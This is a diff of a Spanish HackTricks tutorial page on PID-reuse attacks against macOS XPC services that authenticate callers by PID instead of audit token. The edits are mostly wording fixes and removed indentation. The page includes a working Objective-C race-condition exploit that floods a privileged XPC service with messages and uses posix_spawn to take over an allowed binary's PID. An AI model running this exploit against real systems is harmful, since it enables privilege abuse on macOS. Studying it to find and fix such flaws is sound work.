@@ -7,23 +7,23 @@
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 ## Reutilización de PID
 
-Cuando un servicio **XPC** de macOS está verificando el proceso llamado basándose en el **PID** y no en el **token de auditoría**, es vulnerable a un ataque de reutilización de PID. Este ataque se basa en una **condición de carrera** en la que un **exploit** va a **enviar mensajes al servicio XPC** abusando de la funcionalidad y justo **después** de eso, ejecutando **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** con el binario permitido.
+Cuando un servicio **XPC de macOS** verifica el proceso llamado basándose en el **PID** y no en el **token de auditoría**, es vulnerable a un ataque de reutilización de PID. Este ataque se basa en una **condición de carrera** donde un **exploit** va a **enviar mensajes al servicio XPC** abusando de la funcionalidad y justo **después** ejecutar **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** con el binario **permitido**.
 
-Esta función hará que el **binario permitido posea el PID** pero el **mensaje XPC malicioso ya habría sido enviado** justo antes. Por lo tanto, si el servicio **XPC** utiliza el **PID** para **autenticar** al remitente y lo verifica **DESPUÉS** de la ejecución de **`posix_spawn`**, pensará que proviene de un proceso **autorizado**.
+Esta función hará que el binario **permitido sea dueño del PID**, pero el **mensaje XPC malicioso ya habrá sido enviado** justo antes. Por lo tanto, si el servicio **XPC** utiliza el **PID** para **autenticar** al remitente y lo verifica **DESPUÉS** de la ejecución de **`posix_spawn`**, pensará que proviene de un proceso **autorizado**.
 
 ### Ejemplo de exploit
 
-Si encuentras la función **`shouldAcceptNewConnection`** o una función llamada por ella que **llame** a **`processIdentifier`** y no llame a **`auditToken`**, es muy probable que esté verificando el PID del proceso y no el token de auditoría.\
+Si encuentras la función **`shouldAcceptNewConnection`** o una función llamada por ella que **llame a** **`processIdentifier`** y no llame a **`auditToken`**, es muy probable que esté verificando el PID del proceso y no el token de auditoría.\
 Como por ejemplo en esta imagen (tomada de la referencia):
 
-<figure><img src="../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Comprueba este ejemplo de exploit (de nuevo, tomado de la referencia) para ver las 2 partes del exploit:
 
@@ -31,7 +31,7 @@ Comprueba este ejemplo de exploit (de nuevo, tomado de la referencia) para ver l
 * **Cada fork** enviará el **payload** al servicio XPC mientras ejecuta **`posix_spawn`** justo después de enviar el mensaje.
 
 {% hint style="danger" %}
-Para que el exploit funcione, es importante exportar export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES o ponerlo en el exploit:
+Para que el exploit funcione, es importante exportar exportar OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES o ponerlo en el exploit:
 ```objectivec
 asm(".section __DATA,__objc_fork_ok\n"
 "empty:\n"
@@ -83,63 +83,63 @@ extern char **environ;
 
 void child() {
 
-    // send the XPC messages
-    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
-    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
-    xpcConnection.remoteObjectInterface = remoteInterface;
+// send the XPC messages
+NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
+NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
+xpcConnection.remoteObjectInterface = remoteInterface;
 
-    [xpcConnection resume];
-    [xpcConnection.remoteObjectProxy restartOS];
+[xpcConnection resume];
+[xpcConnection.remoteObjectProxy restartOS];
 
-    char target_binary[] = BINARY;
-    char *target_argv[] = {target_binary, NULL};
-    posix_spawnattr_t attr;
-    posix_spawnattr_init(&attr);
-    short flags;
-    posix_spawnattr_getflags(&attr, &flags);
-    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
-    posix_spawnattr_setflags(&attr, flags);
-    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
+char target_binary[] = BINARY;
+char *target_argv[] = {target_binary, NULL};
+posix_spawnattr_t attr;
+posix_spawnattr_init(&attr);
+short flags;
+posix_spawnattr_getflags(&attr, &flags);
+flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
+posix_spawnattr_setflags(&attr, flags);
+posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
 }
 
 bool create_nstasks() {
 
-    NSString *exec = [[NSBundle mainBundle] executablePath];
-    NSTask *processes[RACE_COUNT];
+NSString *exec = [[NSBundle mainBundle] executablePath];
+NSTask *processes[RACE_COUNT];
 
-    for (int i = 0; i < RACE_COUNT; i++) {
-        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
-    }
+for (int i = 0; i < RACE_COUNT; i++) {
+processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
+}
 
-    int i = 0;
-    struct timespec ts = {
-        .tv_sec = 0,
-        .tv_nsec = 500 * 1000000,
-    };
+int i = 0;
+struct timespec ts = {
+.tv_sec = 0,
+.tv_nsec = 500 * 1000000,
+};
 
-    nanosleep(&ts, NULL);
-    if (++i > 4) {
-        for (int i = 0; i < RACE_COUNT; i++) {
-            [processes[i] terminate];
-        }
-        return false;
-    }
+nanosleep(&ts, NULL);
+if (++i > 4) {
+for (int i = 0; i < RACE_COUNT; i++) {
+[processes[i] terminate];
+}
+return false;
+}
 
-    return true;
+return true;
 }
 
 int main(int argc, const char * argv[]) {
 
-    if(argc > 1) {
-        // called from the NSTasks
-        child();
+if(argc > 1) {
+// called from the NSTasks
+child();
 
-    } else {
-        NSLog(@"Starting the race");
-        create_nstasks();
-    }
+} else {
+NSLog(@"Starting the race");
+create_nstasks();
+}
 
-    return 0;
+return 0;
 }obj
 ```
 ## Referencias
@@ -154,7 +154,7 @@ int main(int argc, const char * argv[]) {
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
